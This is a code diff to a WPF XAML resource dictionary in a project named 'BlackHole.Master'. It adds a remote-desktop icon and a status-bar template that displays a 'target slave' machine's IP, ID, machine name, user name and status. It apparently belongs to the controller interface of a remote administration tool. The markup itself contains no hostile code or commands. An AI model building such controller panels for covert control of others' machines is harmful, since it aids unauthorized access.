@@ -2,9 +2,12 @@
                     xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
                     xmlns:local="clr-namespace:BlackHole.Master">
     <Image x:Key="FileManagerIcon" Source="Resources/icons/light/appbar.cabinet.files.variant.png" Width="20" Height="20" />
+    <Image x:Key="RemoteDesktopIcon" Source="Resources/icons/light/appbar.monitor.png" Width="20" Height="20" />
+    
     <Image x:Key="DownloadFileIcon" Source="Resources/icons/light/appbar.page.download.png" Width="20" Height="20" />
     <Image x:Key="DeleteFileIcon" Source="Resources/icons/light/appbar.delete.png" Width="20" Height="20" />
     <Image x:Key="CancelTransactionIcon" Source="Resources/icons/light/appbar.cancel.png" Width="20" Height="20" />
+    
     <Storyboard x:Key="HighlightEffect">
         <ColorAnimation BeginTime="0:0:0"
                   Duration="0:0:0.01"
@@ -29,5 +32,61 @@
                                             From="1"
                                             To="0" />
     </Storyboard>
+
+    <DataTemplate x:Key="TargetSlaveStatusBar">
+        <StatusBar Name="TargetStatusBar" Margin="10" BorderThickness="1" BorderBrush="Black" Background="White">
+            <StatusBar.ItemsPanel>
+                <ItemsPanelTemplate>
+                    <Grid>
+                        <Grid.ColumnDefinitions>
+                            <ColumnDefinition Width="Auto" />
+                            <ColumnDefinition Width="Auto" />
+                            <ColumnDefinition Width="Auto" />
+                            <ColumnDefinition Width="Auto" />
+                            <ColumnDefinition Width="Auto" />
+                            <ColumnDefinition Width="Auto" />
+                            <ColumnDefinition Width="Auto" />
+                            <ColumnDefinition Width="Auto" />
+                            <ColumnDefinition Width="Auto" />
+                            <ColumnDefinition Width="Auto" />
+                            <ColumnDefinition Width="Auto" />
+                        </Grid.ColumnDefinitions>
+                    </Grid>
+                </ItemsPanelTemplate>
+            </StatusBar.ItemsPanel>
+            <StatusBarItem Grid.Column="0">
+                <Label Name="TargetIp" Content="{Binding Ip}" Foreground="DarkGreen" />
+            </StatusBarItem>
+            <Separator Grid.Column="1" />
+            <StatusBarItem Grid.Column="2">
+                <Label Name="TargetId" Content="{Binding Id}" Foreground="DarkGreen" />
+            </StatusBarItem>
+            <Separator Grid.Column="3" />
+            <StatusBarItem Grid.Column="4">
+                <Label Name="TargetMachineName" Content="{Binding MachineName}" Foreground="DarkGreen" />
+            </StatusBarItem>
+            <Separator Grid.Column="5" />
+            <StatusBarItem Grid.Column="6">
+                <Label Name="TargetUserName" Content="{Binding UserName}" Foreground="DarkGreen" />
+            </StatusBarItem>
+            <Separator Grid.Column="7" />
+            <StatusBarItem Grid.Column="8">
+                <Label Name="TotalTransaction" Content="Total transactions : 0" Foreground="DarkGreen" />
+            </StatusBarItem>
+            <Separator Grid.Column="9" />
+            <StatusBarItem Grid.Column="10">
+                <Label Name="TargetStatus" Content="Stable" FontWeight="ExtraBold">
+                    <Label.ToolTip>
+                        <ToolTip Name="TargetStatusTooltip" Placement="Top" ToolTipService.ShowDuration="5">
+                            <StackPanel>
+                                <TextBlock Name="TargetStatusTooltipTitle" FontWeight="Bold">Nothing</TextBlock>
+                                <TextBlock Name="TargetStatusTooltipMessage">Nothing</TextBlock>
+                            </StackPanel>
+                        </ToolTip>
+                    </Label.ToolTip>
+                </Label>
+            </StatusBarItem>
+        </StatusBar>
+    </DataTemplate>
 </ResourceDictionary>
     
